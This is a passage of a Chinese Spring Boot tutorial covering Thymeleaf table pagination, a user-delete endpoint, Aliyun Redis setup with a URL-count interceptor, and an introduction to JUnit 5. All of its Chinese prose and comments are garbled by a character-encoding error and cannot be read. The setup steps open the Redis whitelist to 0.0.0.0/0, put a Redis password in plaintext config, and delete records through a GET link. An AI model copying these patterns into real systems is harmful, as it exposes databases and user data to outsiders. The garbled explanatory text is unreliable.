class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>email<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ“ä½œ<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;gradeX&quot;</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user: $&#123;users.records&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.id&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>[[$&#123;user.name&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.age&#125;&quot;</span>&gt;</span>Win 95+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.email&#125;&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/user/delete/&#123;id&#125;(id=$&#123;user.id&#125;,pn=$&#123;users.current&#125;)&#125;&quot;</span> </span><br><span class="hljs-tag">                   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger btn-sm&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;span6&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dataTables_info&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamic-table_info&quot;</span>&gt;</span><br>            å½“å‰ç¬¬[[$&#123;users.current&#125;]]é¡µ  æ€»è®¡ [[$&#123;users.pages&#125;]]é¡µ  å…±[[$&#123;users.total&#125;]]æ¡è®°å½•<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;span6&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dataTables_paginate paging_bootstrap pagination&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;prev disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>â† å‰ä¸€é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">th:class</span>=<span class="hljs-string">&quot;$&#123;num == users.current?&#x27;active&#x27;:&#x27;&#x27;&#125;&quot;</span> </span><br><span class="hljs-tag">                    <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;num:$&#123;#numbers.sequence(1,users.pages)&#125;&quot;</span> &gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/dynamic_table(pn=$&#123;num&#125;)&#125;&quot;</span>&gt;</span>[[$&#123;num&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;next disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>ä¸‹ä¸€é¡µ â†’ <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>#numbers</code>è¡¨ç¤ºmethods for formatting numeric objects.<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#expression-utility-objects">link</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user/delete/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id,</span><br><span class="hljs-params">                         <span class="hljs-meta">@RequestParam(value = &quot;pn&quot;,defaultValue = &quot;1&quot;)</span>Integer pn,</span><br><span class="hljs-params">                         RedirectAttributes ra)</span>&#123;<br><br>    userService.removeById(id);<br><br>    ra.addAttribute(<span class="hljs-string">&quot;pn&quot;</span>,pn);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/dynamic_table&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value=&quot;pn&quot;,defaultValue = &quot;1&quot;)</span> Integer pn,Model model)</span>&#123;<br>    <span class="hljs-comment">//è¡¨æ ¼å†…å®¹çš„éå†</span><br><br>    <span class="hljs-comment">//ä»æ•°æ®åº“ä¸­æŸ¥å‡ºuserè¡¨ä¸­çš„ç”¨æˆ·è¿›è¡Œå±•ç¤º</span><br><br>    <span class="hljs-comment">//æ„é€ åˆ†é¡µå‚æ•°</span><br>    Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(pn, <span class="hljs-number">2</span>);<br>    <span class="hljs-comment">//è°ƒç”¨pageè¿›è¡Œåˆ†é¡µ</span><br>    Page&lt;User&gt; userPage = userService.page(page, <span class="hljs-literal">null</span>);<br><br>    model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,userPage);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="69ã€æ•°æ®è®¿é—®-å‡†å¤‡é˜¿é‡Œäº‘Redisç¯å¢ƒ"><a href="#69ã€æ•°æ®è®¿é—®-å‡†å¤‡é˜¿é‡Œäº‘Redisç¯å¢ƒ" class="headerlink" title="69ã€æ•°æ®è®¿é—®-å‡†å¤‡é˜¿é‡Œäº‘Redisç¯å¢ƒ"></a>69ã€æ•°æ®è®¿é—®-å‡†å¤‡é˜¿é‡Œäº‘Redisç¯å¢ƒ</h2><p><strong>æ·»åŠ ä¾èµ–</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--å¯¼å…¥jedis--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>redis.clients<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jedis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>RedisAutoConfiguration</code>è‡ªåŠ¨é…ç½®ç±»ï¼ŒRedisProperties å±æ€§ç±» â€“&gt; spring.redis.xxxæ˜¯å¯¹redisçš„é…ç½®ã€‚</li><li>è¿æ¥å·¥å‚<code>LettuceConnectionConfiguration</code>ã€<code>JedisConnectionConfiguration</code>æ˜¯å‡†å¤‡å¥½çš„ã€‚</li><li>è‡ªåŠ¨æ³¨å…¥äº†<code>RedisTemplate&lt;Object, Object&gt;</code>ï¼Œ<code>xxxTemplate</code>ã€‚</li><li>è‡ªåŠ¨æ³¨å…¥äº†<code>StringRedisTemplate</code>ï¼Œkeyï¼Œvalueéƒ½æ˜¯String</li><li>åº•å±‚åªè¦æˆ‘ä»¬ä½¿ç”¨<code>StringRedisTemplate</code>ã€<code>RedisTemplate</code>å°±å¯ä»¥æ“ä½œRedisã€‚</li></ul><p><strong>å¤–ç½‘Redisç¯å¢ƒæ­å»º</strong>ï¼š</p><ol><li><p>é˜¿é‡Œäº‘æŒ‰é‡ä»˜è´¹Redisï¼Œå…¶ä¸­é€‰æ‹©<strong>ç»å…¸ç½‘ç»œ</strong>ã€‚</p></li><li><p>ç”³è¯·Redisçš„å…¬ç½‘è¿æ¥åœ°å€ã€‚</p></li><li><p>ä¿®æ”¹ç™½åå•ï¼Œå…è®¸<code>0.0.0.0/0</code>è®¿é—®ã€‚</p></li></ol><h2 id="70ã€æ•°æ®è®¿é—®-Redisæ“ä½œä¸ç»Ÿè®¡å°å®éªŒ"><a href="#70ã€æ•°æ®è®¿é—®-Redisæ“ä½œä¸ç»Ÿè®¡å°å®éªŒ" class="headerlink" title="70ã€æ•°æ®è®¿é—®-Redisæ“ä½œä¸ç»Ÿè®¡å°å®éªŒ"></a>70ã€æ•°æ®è®¿é—®-Redisæ“ä½œä¸ç»Ÿè®¡å°å®éªŒ</h2><p>ç›¸å…³Redisé…ç½®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">spring:<br>  redis:<br>#   url: redis:<span class="hljs-comment">//lfy:Lfy123456@r-bp1nc7reqesxisgxpipd.redis.rds.aliyuncs.com:6379</span><br>    host: r-bp1nc7reqesxisgxpipd.redis.rds.aliyuncs.com<br>    port: <span class="hljs-number">6379</span><br>    password: lfy:Lfy123456<br>    client-type: jedis<br>    jedis:<br>      pool:<br>        max-active: <span class="hljs-number">10</span><br>#   lettuce:# å¦ä¸€ä¸ªç”¨æ¥è¿æ¥redisçš„javaæ¡†æ¶<br>#      pool:<br>#        max-active: <span class="hljs-number">10</span><br>#        min-idle: <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•Redisè¿æ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br><br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisConnectionFactory redisConnectionFactory;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testRedis</span><span class="hljs-params">()</span>&#123;<br>        ValueOperations&lt;String, String&gt; operations = redisTemplate.opsForValue();<br><br>        operations.set(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> operations.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(hello);<br><br>        System.out.println(redisConnectionFactory.getClass());<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Redis Desktop Managerï¼šå¯è§†åŒ–Redisç®¡ç†è½¯ä»¶ã€‚</p><p>URLç»Ÿè®¡æ‹¦æˆªå™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisUrlCountInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br><br>        <span class="hljs-comment">//é»˜è®¤æ¯æ¬¡è®¿é—®å½“å‰uriå°±ä¼šè®¡æ•°+1</span><br>        redisTemplate.opsForValue().increment(uri);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨å†ŒURLç»Ÿè®¡æ‹¦æˆªå™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisUrlCountInterceptor redisUrlCountInterceptor;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br><br>        registry.addInterceptor(redisUrlCountInterceptor)<br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)<br>                .excludePathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>,<span class="hljs-string">&quot;/css/**&quot;</span>,<span class="hljs-string">&quot;/fonts/**&quot;</span>,<span class="hljs-string">&quot;/images/**&quot;</span>,<br>                        <span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/aa/**&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Filterã€Interceptor å‡ ä¹æ‹¥æœ‰ç›¸åŒçš„åŠŸèƒ½ï¼Ÿ</p><ul><li>Filteræ˜¯Servletå®šä¹‰çš„åŸç”Ÿç»„ä»¶ï¼Œå®ƒçš„å¥½å¤„æ˜¯è„±ç¦»Springåº”ç”¨ä¹Ÿèƒ½ä½¿ç”¨ã€‚</li><li>Interceptoræ˜¯Springå®šä¹‰çš„æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨Springçš„è‡ªåŠ¨è£…é…ç­‰åŠŸèƒ½ã€‚</li></ul><p>è°ƒç”¨Rediså†…çš„ç»Ÿè®¡æ•°æ®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br><span class="hljs-meta">@Autowired</span><br>    StringRedisTemplate redisTemplate;<br>    <br><span class="hljs-meta">@GetMapping(&quot;/main.html&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">mainPage</span><span class="hljs-params">(HttpSession session,Model model)</span>&#123;<br><br>        log.info(<span class="hljs-string">&quot;å½“å‰æ–¹æ³•æ˜¯ï¼š&#123;&#125;&quot;</span>,<span class="hljs-string">&quot;mainPage&quot;</span>);<br><br>        ValueOperations&lt;String, String&gt; opsForValue =<br>                redisTemplate.opsForValue();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> opsForValue.get(<span class="hljs-string">&quot;/main.html&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> opsForValue.get(<span class="hljs-string">&quot;/sql&quot;</span>);<br><br>        model.addAttribute(<span class="hljs-string">&quot;mainCount&quot;</span>,s);<br>        model.addAttribute(<span class="hljs-string">&quot;sqlCount&quot;</span>,s1);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;main&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="71ã€å•å…ƒæµ‹è¯•-JUnit5ç®€ä»‹"><a href="#71ã€å•å…ƒæµ‹è¯•-JUnit5ç®€ä»‹" class="headerlink" title="71ã€å•å…ƒæµ‹è¯•-JUnit5ç®€ä»‹"></a>71ã€å•å…ƒæµ‹è¯•-JUnit5ç®€ä»‹</h2><p><strong>Spring Boot 2.2.0 ç‰ˆæœ¬å¼€å§‹å¼•å…¥ JUnit 5 ä½œä¸ºå•å…ƒæµ‹è¯•é»˜è®¤åº“</strong></p><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations">JUnit 5å®˜æ–¹æ–‡æ¡£</a></p><p>ä½œä¸ºæœ€æ–°ç‰ˆæœ¬çš„JUnitæ¡†æ¶ï¼ŒJUnit5ä¸ä¹‹å‰ç‰ˆæœ¬çš„JUnitæ¡†æ¶æœ‰å¾ˆå¤§çš„ä¸åŒã€‚ç”±ä¸‰ä¸ªä¸åŒå­é¡¹ç›®çš„å‡ ä¸ªä¸åŒæ¨¡å—ç»„æˆã€‚</p><p><strong>JUnit 5 &#x3D; JUnit Platform + JUnit Jupiter + JUnit Vintage</strong></p><ul><li><p><strong>JUnit Platform</strong>: Junit Platformæ˜¯åœ¨JVMä¸Šå¯åŠ¨æµ‹è¯•æ¡†æ¶çš„åŸºç¡€ï¼Œä¸ä»…æ”¯æŒJunitè‡ªåˆ¶çš„æµ‹è¯•å¼•æ“ï¼Œå…¶ä»–æµ‹è¯•å¼•æ“ä¹Ÿéƒ½å¯ä»¥æ¥å…¥ã€‚</p></li><li><p><strong>JUnit Jupiter</strong>: JUnit Jupiteræä¾›äº†JUnit5çš„æ–°çš„ç¼–ç¨‹æ¨¡å‹ï¼Œæ˜¯JUnit5æ–°ç‰¹æ€§çš„æ ¸å¿ƒã€‚å†…éƒ¨åŒ…å«äº†ä¸€ä¸ª<strong>æµ‹è¯•å¼•æ“</strong>ï¼Œç”¨äºåœ¨Junit Platformä¸Šè¿è¡Œã€‚</p></li><li><p><strong>JUnit Vintage</strong>: ç”±äºJUintå·²ç»å‘å±•å¤šå¹´ï¼Œä¸ºäº†ç…§é¡¾è€çš„é¡¹ç›®ï¼ŒJUnit Vintageæä¾›äº†å…¼å®¹JUnit4.xï¼ŒJUnit3.xçš„æµ‹è¯•å¼•æ“ã€‚</p></li></ul><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li><p>SpringBoot 2.4 ä»¥ä¸Šç‰ˆæœ¬ç§»é™¤äº†é»˜è®¤å¯¹ Vintage çš„ä¾èµ–ã€‚å¦‚æœéœ€è¦å…¼å®¹JUnit4éœ€è¦è‡ªè¡Œå¼•å…¥ï¼ˆä¸èƒ½ä½¿ç”¨JUnit4çš„åŠŸèƒ½ @Testï¼‰</p></li><li><p>JUnit 5â€™s Vintageå·²ç»ä»<code>spring-boot-starter-test</code>ä»ç§»é™¤ã€‚å¦‚æœéœ€è¦ç»§ç»­å…¼å®¹Junit4éœ€è¦è‡ªè¡Œå¼•å…¥Vintageä¾èµ–ï¼š</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.vintage<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-vintage-engine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.hamcrest<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hamcrest-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨æ·»åŠ JUnit 5ï¼Œæ·»åŠ å¯¹åº”çš„starterï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>Springçš„JUnit 5çš„åŸºæœ¬å•å…ƒæµ‹è¯•æ¨¡æ¿ï¼ˆSpringçš„JUnit4çš„æ˜¯<code>@SpringBootTest</code>+<code>@RunWith(SpringRunner.class)</code>ï¼‰ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.Assertions;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<span class="hljs-comment">//æ³¨æ„ä¸æ˜¯org.junit.Testï¼ˆè¿™æ˜¯JUnit4ç‰ˆæœ¬çš„ï¼‰</span><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringBootApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Component component;<br>    <br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-comment">//@Transactional æ ‡æ³¨åè¿æ¥æ•°æ®åº“æœ‰å›æ»šåŠŸèƒ½</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>Assertions.assertEquals(<span class="hljs-number">5</span>, component.getFive());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Jupiter</p><p>è‹± [ËˆdÊ’uËpÉªtÉ™(r)]   ç¾ [ËˆdÊ’uËpÉªtÉ™r]</p><p>n. æœ¨æ˜Ÿ(å¤ªé˜³ç³»ä¸­æœ€å¤§çš„è¡Œæ˜Ÿ)</p></blockquote><blockquote><p>vintage</p><p>è‹± 